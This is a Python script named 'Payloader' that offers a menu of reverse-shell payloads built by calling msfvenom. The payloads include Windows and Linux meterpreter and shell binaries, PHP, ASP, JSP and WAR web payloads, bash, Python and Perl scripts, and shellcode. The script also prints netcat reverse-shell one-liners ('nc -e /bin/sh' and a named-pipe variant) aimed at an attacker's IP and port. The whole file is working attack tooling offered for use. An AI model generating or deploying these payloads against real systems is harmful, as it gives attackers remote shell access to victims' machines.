#!/usr/bin/python

import termcolor
import pyfiglet
import subprocess

def banner():
#    print(termcolor.colored('==============================================================', 'red'))
    print(termcolor.colored('                   Quick Payload Generator', 'red', attrs=['bold']))
    ban = pyfiglet.figlet_format('        PAYLOADER')
    print(termcolor.colored(ban, 'red', attrs=['bold']))
    print(termcolor.colored('               Written by: pwnshell', 'red', attrs=['bold']))
    print(termcolor.colored('               Github Link: https://github.com/pwnshell/Payloader', 'red', attrs=['bold']))
 #   print(termcolor.colored('==============================================================', 'red'))

def list_os():
    print(termcolor.colored('\n[+] Select your Payload type:', 'red', attrs=['bold']))
    print(termcolor.colored('\n[+] 1. Reverse shell binary payload for Windows', 'green', attrs=['bold']))
    print(termcolor.colored('[+] 2. Reverse shell binary payload for Linux', 'green', attrs=['bold']))
    print(termcolor.colored('[+] 3. Web Payloads(php,java,asp)', 'green', attrs=['bold']))
    print(termcolor.colored('[+] 4. Scripting Payloads', 'green', attrs=['bold']))
    print(termcolor.colored('[+] 5. Shellcode Payloads', 'green', attrs=['bold']))
    print(termcolor.colored('[+] 6. Netcat Reverse Shell', 'green', attrs=['bold']))


def selection():
    select = "1"
    select_1 = "1"
    while select  != "6":
        try:
            list_os()
            select = input(termcolor.colored('\nEnter your selection: ', 'red', attrs=['bold']))
            if select == "1":
                while select_1 != 4:
                    print(termcolor.colored('\nPayloads Available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. windows/meterpreter/reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. windows/x64/meterpreter/reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 3. windows/shell_reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 4. windows/shell/reverse_tcp', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "3":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "4":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "exe", "-o", "/tmp/payload.exe"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                exit()
            elif select == "2":
                while select_1 != 4:
                    print(termcolor.colored('\nPayloads Available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. linux/x86/meterpreter_reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. linux/x86/meterpreter/reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 3. linux/x86/shell/reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 4. linux/x86/shell_reverse_tcp', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "3":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "linux/x86/shell/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "4":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "linux/x86/shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "elf", "-o", "/tmp/payload.elf"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()

            elif select == "3":
                while select_1 != 5:
                    print(termcolor.colored('\nPayloads Available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. php/meterpreter_reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. php/meterpreter/reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 3. windows/meterpreter/reverse_tcp [ASP Payload]', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 4. java/jsp_shell_reverse_tcp', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 5. java/jsp_shell_reverse_tcp [WAR Payload]', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "php/meterpreter_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.php"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "php/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.php"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "3":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "asp", "-o", "/tmp/payload.asp"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "4":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.jsp"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()

                    elif select_1 == "5":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "java/jsp_shell_reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "war", "-o", "/tmp/payload.war"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
            
            elif select == "4":
                while select_1 != 3:
                    print(termcolor.colored('\nPayloads Available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. cmd/unix/reverse_python', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. cmd/unix/reverse_bash', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 3. cmd/unix/reverse_perl', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_python", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.py"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_bash", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.sh"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "3":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "cmd/unix/reverse_perl", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", "raw", "-o", "/tmp/payload.pl"])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()

            elif select == "5":
                while select_1 != 3:
                    print(termcolor.colored('\nPayloads Available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. linux/x86/meterpreter/reverse_tcp [Linux Based]', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. windows/meterpreter/reverse_tcp [Windows Based]', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        lang = input(termcolor.colored('LANG i.e. python or c: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", lang, "-o", "/tmp/shellcode_" + lang])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nLHOST IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('LPORT: ', 'red', attrs=['bold']))
                        lang = input(termcolor.colored('LANG i.e. python or c: ', 'red', attrs=['bold']))
                        subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + str(lhost), "LPORT=" + str(lport), "-f", lang, "-o", "/tmp/shellcode_" + lang])
                        print(termcolor.colored('\nPayload written to /tmp directory', 'green', attrs=['bold']))
                        exit()
            
            elif select == "6":
                while select_1 != 3:
                    print(termcolor.colored('\nNetcat payloads available:', 'red', attrs=['bold']))
                    print(termcolor.colored('\n[+] 1. nc -e /bin/sh attacker-ip port', 'blue', attrs=['bold']))
                    print(termcolor.colored('\n[+] 2. rm -f /tmp/p; mknod /tmp/p p && nc attacker-ip port 0/tmp/p', 'blue', attrs=['bold']))
                    select_1 = input(termcolor.colored('\nSelect Payload: ', 'red', attrs=['bold']))
                    if select_1 == "1":
                        lhost = input(termcolor.colored('\nATTACKER IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('ATTACKER PORT: ', 'red', attrs=['bold']))
                        print(termcolor.colored('\nPayload: nc -e /bin/sh ' + lhost + " "  + lport, 'green', attrs=['bold']))
                        exit()
                    elif select_1 == "2":
                        lhost = input(termcolor.colored('\nATTACKER IP: ', 'red', attrs=['bold']))
                        lport = input(termcolor.colored('ATTACKER PORT: ', 'red', attrs=['bold']))
                        print(termcolor.colored('\nPayload: rm -f /tmp/p; mknod /tmp/p p && nc ' + lhost + " " + lport + " " + '0/tmp/p', 'green', attrs=['bold']))
                        exit()
        except KeyboardInterrupt:
            print(termcolor.colored('\n[+] Ctrl C, Bye...', 'red', attrs=['bold']))
            exit()
        


banner()
selection()
